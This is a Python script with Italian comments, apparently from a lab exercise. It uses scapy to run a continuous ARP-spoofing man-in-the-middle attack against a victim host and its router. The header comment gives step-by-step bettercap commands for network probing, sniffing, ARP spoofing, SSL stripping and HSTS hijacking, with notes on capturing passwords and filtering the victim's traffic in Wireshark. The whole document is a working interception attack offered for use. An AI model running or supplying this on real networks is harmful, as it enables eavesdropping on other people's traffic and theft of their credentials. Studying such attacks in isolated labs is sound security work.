#N.B. una volta lanciato lo script python la connessione internet
#dell'attaccato non funziona piu' per questo deve essere lanciato
#sulla shell dell'attaccante i seguenti comandi: 
#
#  sudo iptables -P FORWARD ACCEPT
#  sudo sysctl -w net.ipv4.ip_forward=1
#
#e la connessione internet dell'attaccato ritornera' normale
# successivamente in wireshark : ip.src == 192.168.58.129

#per una spiegzione detagliata taking HTTP traffic https://www.youtube.com/watch?v=Peu0AEpHUVs&list=PLA3BVzhXP1c2lNCtSBl-OLHtc-rr9jlcd&ab_channel=HoxFramework
#
#Sito per verificare : HSTS (HTTP Strict Transport Security) Test
#https://domsignal.com/
#
#se e' impostata il seguente flag nella risposta del server : strict-transport-security max-age=15552000; preload l'attacco alla password non funziona
#comandi ettercap:
# sudo bettercap -iface eth0
# help
# caplets.update(probabilmemte non funziona)
#
# set http.proxy.sslstrip true
#HSTS Hijacking
#Il modulo hstshijack di Bettercap tenta di bypassare la protezione offerta da HSTS tramite un attacco di downgrade del traffico, 
#dirottando le richieste HTTPS e costringendo la vittima a connettersi tramite HTTP non sicuro. Una volta che il traffico è passato a HTTP, 
#un attaccante in grado di eseguire un MITM potrebbe intercettare, modificare o iniettare contenuti nelle pagine.
#Limitazioni e Protezioni
#Precaricamento HSTS: Molti siti implementano un meccanismo di HSTS preloaded, che indica al browser di applicare sempre HTTPS, anche al primo accesso. Questo rende l'attacco inefficace. per verificarlo andare su hstspreload.org
# hstshijack/hstshijack
#
#net.probe on 
#attiva il modulo di scansione passiva della rete, che cerca 
#attivamente dispositivi connessi alla rete locale. Questo modulo cerca di identificare e 
#mappare tutti gli host nella rete, inclusi i dispositivi collegati, senza bisogno di inviare pacchetti di scansione visibili che potrebbero allertare il target.
#
#net.sniff on
#Quando attivi questo comando, Bettercap comincia a intercettare e catturare i pacchetti che transitano sulla rete a cui sei connesso, inclusi i pacchetti di #protocolli comuni come HTTP, DNS, FTP
#
#sito sul quale fare le prove: https://web.mit.edu/
#
#arp.spoof on
#inizia a inviare falsi messaggi ARP (Address Resolution Protocol) sulla rete per ingannare i dispositivi connessi. L'attaccante si "finge" un altro dispositivo, #solitamente il gateway o un altro host, in modo che il traffico di rete venga instradato attraverso la sua macchina.

from scapy.all import ARP, send
import time

# Funzione per inviare pacchetti ARP spoofing alla vittima
def vittima_spoof(vittima_ip, vittima_mac, fake_mac, fake_ip):
    # Creiamo il pacchetto ARP
    risposta_arp = ARP()
    risposta_arp.op = 2  # '2' indica un ARP response(is-at)
    risposta_arp.pdst = vittima_ip  # IP della vittima
    risposta_arp.hwdst = vittima_mac  # MAC della vittima
    risposta_arp.hwsrc = fake_mac  # MAC falso (del nostro attaccante)
    risposta_arp.psrc = fake_ip  # IP falso (del router)
    # Invia il pacchetto ARP
    send(risposta_arp, verbose=False)

# Funzione per inviare pacchetti ARP spoofing al router
def router_spoof(router_ip, router_mac, fake_mac, fake_ip):
    # Creiamo il pacchetto ARP
    risposta_arp = ARP()
    risposta_arp.op = 2  # '2' indica un ARP response
    risposta_arp.pdst = router_ip  # IP del router
    risposta_arp.hwdst = router_mac  # MAC del router
    risposta_arp.hwsrc = fake_mac  # MAC falso (del nostro attaccante)
    risposta_arp.psrc = fake_ip  # IP della vittima
    # Invia il pacchetto ARP
    send(risposta_arp, verbose=False)

# Verifica che lo script sia eseguito direttamente
if __name__ == "__main__":
    # Definire gli indirizzi IP e MAC (possono essere parametrizzati in futuro)
    vittima_ip = "192.168.176.128"  # IP della vittima
    vittima_mac = "00:0c:29:27:17:b1"  # MAC della vittima
    router_ip = "192.168.176.2"  # IP del router
    router_mac = "00:50:56:ec:86:d6"  # MAC del router (corretto lo spazio in eccesso)
    attaccante_mac = "00:0c:29:0a:a2:9e"  # MAC dell'attaccante (il nostro MAC)
    
    try:
        # Loop infinito fino a quando non si preme Ctrl+C
        while True:
            # Eseguire lo spoofing della vittima
            vittima_spoof(vittima_ip, vittima_mac, attaccante_mac, router_ip)
            # Eseguire lo spoofing del router
            router_spoof(router_ip, router_mac, attaccante_mac, vittima_ip)
            # Aspetta 2 secondi prima di inviare il prossimo pacchetto
            time.sleep(2)
    except KeyboardInterrupt:
        # Gestisce l'uscita dallo script tramite Ctrl+C
        print("Uscita dallo script")


